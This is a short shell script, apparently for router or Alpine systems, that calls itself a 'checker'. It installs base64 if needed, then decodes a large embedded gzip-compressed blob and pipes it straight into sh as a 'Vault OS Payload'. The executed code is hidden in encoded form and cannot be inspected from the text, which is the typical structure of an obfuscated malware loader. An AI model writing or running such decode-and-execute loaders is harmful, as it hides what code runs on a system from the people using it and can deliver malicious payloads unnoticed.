#!/bin/sh
echo "====================================================="
echo "  FIRST STEP - CHECKER MODE - ACTIVATING...."
echo "====================================================="

if ! command -v base64 >/dev/null 2>&1; then
    echo "📦 Preping dependencies..."
    
    if command -v opkg >/dev/null 2>&1; then
        opkg update >/dev/null 2>&1
        opkg install coreutils-base64 >/dev/null 2>&1
    elif command -v apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add coreutils >/dev/null 2>&1 
    else
        echo "❌ ERROR: No package manager found! Cannot install base64."
        exit 1
    fi
    
    if ! command -v base64 >/dev/null 2>&1; then
         echo "❌ ERROR: Base64 installation failed. Aborting."
         exit 1
    fi
fi

PAYLOAD="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
bwckAAA="

echo "🚀 Executing Vault OS Payload..."
echo "$PAYLOAD" | base64 -d | gunzip | sh

exit 0
